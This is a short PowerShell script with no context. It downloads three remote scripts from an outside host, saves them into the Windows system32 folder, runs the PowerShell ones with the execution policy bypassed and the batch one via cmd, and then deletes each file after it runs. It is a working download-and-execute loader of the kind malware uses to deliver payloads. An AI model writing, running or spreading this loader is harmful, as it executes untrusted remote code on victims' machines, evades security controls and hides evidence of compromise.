
$powershellScriptURL1 = "https://cdn.asiantrails-vn.com/back/Public/2.txt"
$powershellScriptURL2 = "https://cdn.asiantrails-vn.com/back/baidu/dow3.txt"
$batchScriptURL = "https://cdn.asiantrails-vn.com/back/Public/1.txt"


$tempScriptPath1 = "C:\windows\system32\script1.ps1"
$tempScriptPath2 = "C:\windows\system32\script2.ps1"
$tempBatchPath = "C:\windows\system32\script.bat"

Function Download-And-Execute-Script {
    param(
        [string]$ScriptURL,
        [string]$Destination
    )

    try {
        Invoke-WebRequest -Uri $ScriptURL -OutFile $Destination -UseBasicParsing -ErrorAction Stop
        if (Test-Path $Destination) {
            Write-Host "Script downloaded to $Destination"
            $scriptExtension = [System.IO.Path]::GetExtension($Destination)
            if ($scriptExtension -eq ".ps1") {
                Invoke-Expression -Command "powershell.exe -ExecutionPolicy Bypass -File `"$Destination`""
            }
            elseif ($scriptExtension -eq ".bat") {
                Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$Destination`"" -Wait
            }
            else {
                Write-Host "Unsupported script file type."
            }

            if ($?) {
                Remove-Item -Path $Destination -Force
                Write-Host "Script executed and removed."
            }
            else {
                Write-Host "Script execution failed."
            }
        }
        else {
            Write-Host "Download failed. Script file not found."
        }
    }
    catch {
        Write-Host "Download and execution failed: $_"
    }
}


Download-And-Execute-Script -ScriptURL $powershellScriptURL1 -Destination $tempScriptPath1
Download-And-Execute-Script -ScriptURL $powershellScriptURL2 -Destination $tempScriptPath2
Download-And-Execute-Script -ScriptURL $batchScriptURL -Destination $tempBatchPath
